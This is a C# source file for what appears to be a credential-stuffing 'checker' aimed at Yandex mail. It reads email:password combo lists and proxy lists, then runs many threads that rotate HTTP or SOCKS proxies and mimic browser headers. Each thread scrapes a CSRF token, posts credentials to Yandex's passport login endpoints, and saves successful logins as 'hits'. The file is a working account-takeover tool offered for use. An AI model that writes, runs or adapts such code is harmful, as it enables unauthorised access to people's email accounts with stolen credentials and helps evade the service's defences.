using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Template;
using yoboi_legend;
using Ebay_Checker;
using System.Net;
using JawBrute;

namespace Ebay_Checker
{
    class yandex
    {
        [STAThread]
        public static void yandexapi()
        {
            Prsc.Yandex();
            Export.Initialize();
            Console.Title = "Mailos | Yandex";
        fuck:
            Console.Clear();
            ASCII.ASCIII();
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                Threads:", Color.SpringGreen);
            Colorful.Console.WriteLine("");
            Colorful.Console.Write("               > ", Color.SpringGreen);
            try
            {
                Variables.threads = int.Parse(Console.ReadLine());
            }
            catch
            {
                Console.WriteLine("Error Parsing Integor...");
                goto fuck;
            }
        fuckme:
            Console.Clear();
            ASCII.ASCIII();
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                [1] HTTP", Color.SpringGreen);
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                [2] SOCKS4", Color.SpringGreen);
            Colorful.Console.WriteLine("");
            Colorful.Console.WriteLine("                [3] SOCKS5", Color.SpringGreen);
            Colorful.Console.WriteLine("");
            Colorful.Console.Write("               > ", Color.SpringGreen);
            string c = Console.ReadLine();
            if (c == "1")
            {
                Variables.proxyprotocol = "HTTP";
            }
            else if (c == "2")
            {
                Variables.proxyprotocol = "SOCKS4";
            }
            else if (c == "3")
            {
                Variables.proxyprotocol = "SOCKS5";
            }
            else
            {
                goto fuckme;
            }
            loadCombos();
        }
        public static void loadCombos()
        {
            OpenFileDialog op = new OpenFileDialog();
            string fileName;
            do
            {
                op.Title = "Load Combos";
                op.DefaultExt = "txt";
                op.Filter = "Text Files|*.txt";
                op.RestoreDirectory = true;
                op.ShowDialog();
                fileName = op.FileName;
            }
            while (!File.Exists(fileName));

            try
            {
                Variables.combos = new List<string>(File.ReadAllLines(fileName));

                using (FileStream FS = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    using (BufferedStream bs = new BufferedStream(FS))
                    {
                        using (StreamReader sr = new StreamReader(bs))
                        {
                            while (sr.ReadLine() != null)
                            {
                                Variables.combototal++;
                            }
                        }
                    }
                }
            }
            catch
            {
            }
            loadProxies();
        }
        public static void loadProxies()
        {
            OpenFileDialog op = new OpenFileDialog();
            string fileName;
            do
            {
                op.Title = "Load Proxies";
                op.DefaultExt = "txt";
                op.Filter = "Text Files|*.txt";
                op.RestoreDirectory = true;
                op.ShowDialog();
                fileName = op.FileName;
            }
            while (!File.Exists(fileName));

            try
            {
                Variables.proxies1 = new List<string>(File.ReadAllLines(fileName));

                using (FileStream FS = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    using (BufferedStream bs = new BufferedStream(FS))
                    {
                        using (StreamReader sr = new StreamReader(bs))
                        {
                            while (sr.ReadLine() != null)
                            {
                                Variables.proxytotal++;
                            }

                        }
                    }
                }
            }
            catch
            {

            }
            startpp();
        }
        public static void startpp()
        {
            Console.Clear();
            ASCII.ASCIII();
            Colorful.Console.WriteLine("               [Non-Existant] = Account Doesnt Exist", Color.IndianRed);
            Colorful.Console.WriteLine("");
            try
            {

                Task.Factory.StartNew(() =>
                {
                    for (; ; )
                    {
                        Variables.cpm = Variables.cpm_aux;
                        Variables.cpm_aux = 0;
                        Colorful.Console.Title = "[Mailos - Yandex] | Hits: " + Variables.hit + " | Bads: " + Variables.bad + " | Non-Existant: " + Variables.free + " | Error: " + Variables.error + " | Checked: " + Variables.check + "/" + Variables.combototal + " | CPM: " + Variables.cpm * 60;
                        Thread.Sleep(1000);
                    }
                });

                for (int i = 1; i <= Variables.threads; i++)
                {
                    new Thread(new ThreadStart(CheckPP)).Start();
                }
            }
            catch
            {

            }
        }
        public static void CheckPP()
        {
        stat:
            for (; ; )
            {

                while (true)
                {
                    //RANDOM PROXY EVERY REQ
                    string proxy = "";
                    Random r = new Random();
                    proxy = Variables.proxies1[r.Next(Variables.proxies1.Count)];

                    try
                    {

                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            //SPLITTIN COMBOS
                            if (Variables.comboindex >= Variables.combos.Count<string>())
                            {
                                break;
                            }
                            Interlocked.Increment(ref Variables.comboindex);
                            string[] s = Variables.combos[Variables.comboindex].Split(new char[]
                            {
                            ':'
                            });
                            //s[0] - Email  | s[1] - Password
                            try
                            {
                                //PROXY HANDEL
                                if (Variables.proxyprotocol == "HTTP")
                                {
                                    httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                                }
                                if (Variables.proxyprotocol == "SOCKS4")
                                {
                                    httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                                }
                                if (Variables.proxyprotocol == "SOCKS5")
                                {
                                    httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                                }
                                //REQUESTS - YOU CAN REPLACE WITH COMPILER CODE HERE, USE UR BRAIN PLEASE THANKS`
                                var US = WebUtility.UrlEncode("" + s[0] + "");
                                var PS = WebUtility.UrlEncode("" + s[1] + "");
                                httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                                httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
                                httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9,fa;q=0.8");
                                httpRequest.AddHeader("Connection", "keep-alive");
                                httpRequest.AddHeader("Sec-Fetch-Dest", "document");
                                httpRequest.AddHeader("Sec-Fetch-Mode", "navigate");
                                httpRequest.AddHeader("Sec-Fetch-Site", "none");
                                httpRequest.AddHeader("Sec-Fetch-User", "?1");
                                httpRequest.AddHeader("Upgrade-Insecure-Requests", "1");
                                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36");

                                var res0 = httpRequest.Get("https://passport.yandex.com/auth?from=mail&origin=hostroot_homer_auth_com&retpath=https%3A%2F%2Fmail.yandex.com%2F&backpath=https%3A%2F%2Fmail.yandex.com%3Fnoretpath%3D1");
                                string text0 = res0.ToString();

                                var csrf = Functions.LR(text0, "csrf_token\" value=\"", "\"").FirstOrDefault();
                                var uuid = Functions.LR(text0, "process_uuid=", "\"").FirstOrDefault();
                                var Token = WebUtility.UrlEncode("" + csrf + "");
                                httpRequest.AddHeader("Accept", "application/json, text/javascript, */*; q=0.01");
                                httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
                                httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9,fa;q=0.8");
                                httpRequest.AddHeader("Connection", "keep-alive");
                                httpRequest.AddHeader("Origin", "https://passport.yandex.com");
                                httpRequest.AddHeader("Referer", "https://passport.yandex.com/auth?from=mail&origin=hostroot_homer_auth_com&retpath=https%3A%2F%2Fmail.yandex.com%2F&backpath=https%3A%2F%2Fmail.yandex.com%3Fnoretpath%3D1");
                                httpRequest.AddHeader("Sec-Fetch-Dest", "empty");
                                httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
                                httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
                                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36");
                                httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");

                                var res1 = httpRequest.Post("https://passport.yandex.com/registration-validations/auth/multi_step/start", "csrf_token=" + Token + "&login=" + US + "&process_uuid=" + uuid + "&retpath=https%3A%2F%2Fmail.yandex.com%2F&origin=hostroot_homer_auth_com&service=mail", "application/x-www-form-urlencoded; charset=UTF-8");
                                string text1 = res1.ToString();

                                if (text1.Contains("{\"primary_alias_type\":1") || text1.Contains("can_authorize\":true"))
                                {
                                    var track = Functions.JSON(text1, "track_id").FirstOrDefault();
                                    httpRequest.AddHeader("Accept", "application/json, text/javascript, */*; q=0.01");
                                    httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
                                    httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9,fa;q=0.8");
                                    httpRequest.AddHeader("Connection", "keep-alive");
                                    httpRequest.AddHeader("Origin", "https://passport.yandex.com");
                                    httpRequest.AddHeader("Referer", "https://passport.yandex.com/auth/welcome?from=mail&origin=hostroot_homer_auth_com&retpath=https%3A%2F%2Fmail.yandex.com%2F&backpath=https%3A%2F%2Fmail.yandex.com%3Fnoretpath%3D1");
                                    httpRequest.AddHeader("Sec-Fetch-Dest", "empty");
                                    httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
                                    httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
                                    httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36");
                                    httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");

                                    var res2 = httpRequest.Post("https://passport.yandex.com/registration-validations/auth/multi_step/commit_password", "csrf_token=" + csrf + "&track_id=" + track + "&password=" + PS + "", "application/x-www-form-urlencoded; charset=UTF-8");
                                    string text2 = res2.ToString();

                                    if (text2.Contains("{\"status\":\"ok\"}"))
                                    {
                                        Variables.hit++;
                                        Variables.cpm_aux++;
                                        Variables.check++;
                                        Colorful.Console.WriteLine("               [HIT] " + s[0] + ":" + s[1], Color.Green);
                                        Export.AsResult("/hit", s[0] + ":" + s[1]);
                                    }
                                    else if (text2.Contains("{\"status\":\"error\",\"errors\":[\"password.not_matched\"]}") || text2.Contains("{\"status\":\"error") || text2.Contains("password.not_matched"))
                                    {
                                        Variables.bad++;
                                        Variables.cpm_aux++;
                                        Variables.check++;
                                        break;
                                    }


                                }
                                else if (text1.Contains("can_register\":true") || text1.Contains("account_type\":\"portal"))
                                {
                                    Variables.free++;
                                    Variables.cpm_aux++;
                                    Variables.check++;

                                    break;
                                }
                                else
                                {
                                    break;//add retry here
                                }









                                {
                                    goto stat;
                                }
                            }
                            catch (Exception ex)
                            {
                                Variables.error++;

                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Variables.error++;
                    }
                }
            }
        }
    }
}